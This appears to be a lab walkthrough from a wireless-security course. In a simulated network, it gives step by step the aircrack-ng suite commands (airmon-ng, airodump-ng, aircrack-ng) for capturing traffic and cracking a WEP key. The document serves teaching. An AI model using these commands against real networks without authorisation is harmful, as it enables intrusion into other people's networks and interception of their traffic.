Select "WEP Attack" from the menu. Allow up to 30 seconds to initialize the network. 

![[11-main-menu.png]]

Three panels will appear in your terminal representing an attacker's machine "Attacker" and two victims (host1 and host2).

![[11-terminals.png]]

On the attacking machine, switch the interface to monitor mode using the following command. 

```
airmon-ng start Attacker-wlan0
```

Successful output of the above command will appear as below. 

![[11-monitor-mode.png]]

Use airodump-ng to begin looking for nearby networks. 

```
airodump-ng wlan0mon
```

Wait for traffic to appear on the console as seen below. 

![[11-airodump.png]]

Note the BSSID and channel before killing the process with \[CTRL + c]. Use this BSSID and channel in the next command. Replace \<CHANNEL> and \<BSSID> with the appropriate information. 

```
airodump-ng -c <CHANNEL> --bssid <BSSID> wlan0mon -w attack_capture
```

As the above command runs, information regarding hosts connected to the target network will appear as seen below. 

![[11-stations.png]]

On host1, note the IP address associated with host1-wlan0 after running the following command. 

```
ifconfig
```

The IP address can be seen within the contents of host1-wlan0 (10.0.0.2).

![[11-host1.png]]

The WEP key will be cracked by collecting regular user traffic. To simulate this traffic, use the following command on host1. 

```
iperf -s
```

The above command will begin listening on port 5001 for traffic as seen below. 

![[11-iperf-listen.png]]

Switch over to host2's terminal and run the following command. Replace HOST1 IP ADDRESS with the IP address of host1.  

```
iperf -c <HOST1 IP ADDRESS> -u -b 100M -t 60
```

The following will appear in the host2 terminal. 

![[11-perf-send.png]]

Wait until about 25,000 packets have been sent (see the Frames column in the airmon console; it should be increasing quickly).

![[11-airodump-frames.png]]

When this number is reached, kill the airmon-ng session on the attacker machine using \[CTRL + c] and run the following command. 

```
aircrack-ng ./attack_capture-01.cap
```

The above command will begin attempting to crack the WEP key. Successful decryption will be similar to the screenshot below (output may appear broken due to tmux - the KEY FOUND output will still be correct).

![[11-wep-key.png]]

This completes all the labs in this series. Please return to the main menu using the main_menu command before leaving. 

RESET: [[Lab 00 - Getting Started]]


Thanks! :)